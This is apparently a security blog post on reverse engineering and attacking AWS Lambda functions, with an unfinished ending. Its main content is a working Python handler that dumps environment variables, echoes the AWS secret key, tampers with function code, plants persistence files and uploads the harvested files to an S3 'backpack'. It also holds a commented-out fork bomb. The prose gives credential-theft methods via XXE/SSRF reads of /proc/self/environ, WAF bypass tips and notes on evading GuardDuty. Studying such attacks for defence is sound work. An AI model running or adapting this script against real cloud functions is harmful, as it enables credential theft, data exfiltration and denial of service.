---
layout: post
title: Lets
---

<p align="center">
<img width="600" src="/images/htl.png">
</p>

Since a Lambda function is stateless and sandboxed, the code gets injected and executed into a disposable environment which is very volatile. The picture below describes a very high level architecture of the behavior of a Lambda function, that can be watched from outside or a high-level perspective.

<p align="center">
<img width="600" src="/images/anatomy-of-a-lambda.png">
</p>

<br>
<br>

<p align="center">
<img width="600" src="/images/reverse-eng-htl.png">
</p>

With the anatomy of AWS Lambda in mind it’s time to reverse engineer and find out if there are some interesting assets around. Let`s perform a temple run, to look behind the curtain. To do so we rely on some Python scripting and Linux knowledge. All source code used can be found below or [here](https://github.com/BenjiTrapp/smashing-aws-lambda)

```python
import boto3, json, sys, os, base64

def lambda_handler(event, context):
    client = boto3.client('lambda', region_name='eu-central-1')
    
    commands = [
        ##################################################
        ### ENTERING THE TEMPLE                        ###
        ##################################################
        'whoami',                       # who am I? 
        'pwd',                          # where are we? 
        'ls',                           # take a first look around
        'cat /proc/1/cgroup',           # looking a little bit more around
        'cat /etc/os-release',          # On which OS are we running?
 
        ##################################################
        ### RAID THE TEMPLE                            ###
        ##################################################
        'env && env > /tmp/env.txt',    # IAM Credentials lurking in the dark
        'echo $AWS_SECRET_ACCESS_KEY',  # get the secret key
        
        ### are there any other treasures?
        'ls /var',
        'ls /var/runtime/',
        
        ### Attempts to messing around in the tomb and head to the exit
        'echo "TEST" >> /var/task/lambda_function.py'
        'cat /var/task/lambda_function.py',
        'echo "Yay, we got persistance" > /tmp/persistance.test',

        ##################################################
        ### ADDITIONAL THINGS (Optional)               ###
        ### ATTEMPTS TO DESTRUCT AND ESCAPE THE TEMPLE ###
        ##################################################
        # Reconing
        #'ulimit -a', # Find out the current maximum processes a 
        'cat /proc/cpuinfo > /tmp/cpu_info.txt', # Infos about the CPU
        
        # let's try to set up the bomb and annoy AWS 
        #"fork() {fork | fork & } fork", 
        #'for((i=1;i<=10000000;i+=2)); do sleep 10s; cat /proc/1/cgroup; echo "Still alive? $i times"; done'
    ]
    
    result = dict()
    
    ### Let's do the temple run 
    #            _
    #          _( }
    # -=  _  <<  \
    #    `.\__/`/\\
    #-=    '--'\\  `
    #   -=     //
    #          \)
    for command in commands:
        print("[+] Processing command: {}".format(command))
        print(os.system(command))
        print("[+] Done\n".format(command))
    
    
    ### Save our treasures in the backpack  
    ### => Don't forget to create a bucket named s3_backpack :)
    res_s3 = boto3.resource('s3')
    res_s3.meta.client.upload_file('/var/runtime/bootstrap.py', 's3_backpack', 'bootstrap.py')
    res_s3.meta.client.upload_file('/tmp/persistance.test', 's3_backpack', 'persistance.test.txt')
    res_s3.meta.client.upload_file('/tmp/cpu_info.txt', 's3_backpack', 'cpu_info.txt')
    res_s3.meta.client.upload_file('/tmp/env.txt', 's3_backpack', 'env.txt')
    res_s3.meta.client.upload_file('/var/task/lambda_function.py', 's3_backpack', 'lambda_function.py')
    
    return {'statusCode': 200}
```
After running the code and using some of the known facts regarding AWS Lambda, we can round it up to the following list:
* Runs on an Amazon Linux (RHEL derivative).
* According to environment variables it runs in EC2 but must be some kind of container system
* Read-only file system
* NON-root user 
* Single AWS IAM role required for access to sandbox
* Reverse sell not possible
* Code is copied to /var/run/task
* Bootstrap under /var/runtime/awslambda <- entry point and backbone 
* Sandbox is thrown away at the end of execution and have a maximum execution time
* Cold start => penalty at initial start ~600ms 
With this knowledge we captured, we have some very valuable information. If we put all the pieces together the result might look like this treasure map:

<p align="center">
<img width="600" src="/images/lambda-architecture.png">
</p>

Based on this we can meditate about the [attack surface]( https://en.wikipedia.org/wiki/Attack_surface). Based on the Anatomy of a Lambda Function from above, we can only strike by injection Code or hook into the execution of the Lambda. 
From here we can derive an attack strategy. Like the Deathstar we have only the chance to hit a tiny thermal exhaust port to get in. The good news, after a perfect hit the attack surface is like the Tardis: It’s bigger on the inside. Let’s check our options and strategies:

* Keep the initial Payload as small as possible
* Use Command Injection, XXE, SSRF or trick the API Gateway to find a way in
* Since a Sandbox gets recycled after each execution and have a limited execution time (often only a few miliseconds to seconds). Therefore we have to move fast
* Persistence is possible in `/tmp` => To avoid the coldstart penalty, people tend to keep their Lambda function warm (for the sake of performance). This can be used to get some sort of persistance
Identify 
* Perform„lateral movement“ options as soon as possible
* Exfiltrate results via other ways/services (push to S3, SQS, SNS Topic etc.)
 
Based on our attack strategy we have a too complex blob, to manage this blob better we can split it up into three sections:

<p align="center">
<img width="600" src="/images/lambda-architecture-busted.png">
</p>

1.	Outer Attack Surface -> The way inside
2.	Inner Attack Surface -> If we made it inside, there are plenty of things we can use to leverage an attack
3.	IAM -> The Quote of Jeff Bryner (@0x7eff) says it all: IAM is the “killer feature” and the “killer feature”

Here's what we can do, based on the three areas and our attack strategy:
* Compromise data 
* Abuse business logic
* Bypass authentication
* Leak secrets
* Denial of service
* Financial exhaustion/ Denial of Wallet
* Execute malicious code
* ...surely much more nasty things

<p align="center">
<img width="700" src="/images/lambda-iam.png">
</p>

In the reverse engineering part above we already learned that IAM credentials are passt into the Lamda function via environment variables. Let’s do one step back, and rethink our attack vectors. As an adversary it can be hard to read environment variables, so we need anothe weakness to achieve this. Those weaknesses could be:

1. [XML External Entities (XXE)](https://cwe.mitre.org/data/definitions/1030.html) to achive the ability to read files
2. [Server Side Ressource Forgery (SSRF)]( CWE - CWE-918: Server-Side Request Forgery (SSRF) (4.6) (mitre.org)) which is the most likely variant of both. Since [everything is a file](https://en.wikipedia.org/wiki/Everything_is_a_file) it`s easy to get your hand on files from outside and even bypass firewalls, because it allows the file protocol 

<br>
<p align="center">
<img width="250" src="/images/lets-raid.png">
</p>

With both weaknesses in mind, we can access the IAM credentials by reading the file `/proc/self/environ`. 
In the case that a direct call on `/proc/self/environ` is blocked by a WAF – it sometimes work to read the environment variables of other processes. This can be achieved by reading `/proc/##/environ`, where '##' is a digit (usually) between 1 and 20.

> Good to know: Unlike the IAM credentials which are associated with EC2 instances, there is no [GuardDuty](/aws/avoiding-detection/steal-keys-undetected/) alert in place to watch stolen Lambda credentials.
Beside the IAM credentials a Lambda function also has event data present. These are usually passed into the function when it‘s starting. This data is made available to the function via the [runtime interface](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html). Unlike IAM credentials, this data can be accessed over genuine SSRF at `http://localhost:9001/2018-06-01/runtime/invocation/next`. This will include information about what invoked the Lambda function and may be valuable depending on the context that is injected. From this point there are a lot of options thinkable. Command Injection ist he most likely attack path for this
 
<br><br>
<p align="center">
<img width="500" src="/images/e30fa9fdb78da311be32f4da56a67db1.png">
</p>

Take a look [here](https://github.com/BenjiTrapp/smashing-aws-lambda) 

Some fancy text is coming later … stay tuned
